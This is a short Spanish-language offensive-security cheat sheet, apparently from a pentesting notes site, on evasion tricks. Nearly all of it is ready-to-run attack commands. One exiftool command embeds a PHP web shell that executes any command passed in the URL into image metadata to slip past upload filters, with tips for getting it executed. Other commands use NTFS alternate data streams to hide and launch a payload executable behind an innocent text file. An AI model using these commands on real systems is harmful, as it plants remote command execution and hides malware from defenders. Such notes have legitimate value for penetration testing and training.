---
title: "Obfuscation & Evasion Tricks"
layout: "single"
category: "Criptografia"
slug: "criptografia/obfuscation"
date: "2025-11-26"
---

### Exiftool (Web Webshell)
Ocultar código PHP en los metadatos de una imagen para saltar filtros de subida (File Upload).
```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); ?>' imagen.jpg
```
*Luego sube la imagen como `imagen.php.jpg` o usa LFI.*

### Windows ADS (Alternate Data Streams)
Ocultar ficheros *detrás* de otros ficheros en NTFS.

**Ocultar payload:**
```cmd
type payload.exe > fichero_legitimo.txt:payload.exe
```
*(El fichero txt parecerá vacío o normal, pero tiene el exe pegado).*

**Ejecutar payload oculto:**
```cmd
# Opción 1: Wupdate
mklink C:\windows\system32\wupdate C:\temp\fichero.txt:payload.exe
wupdate

# Opción 2: Scripting
powershell (Get-Content fichero.txt -Stream payload.exe).Length
```
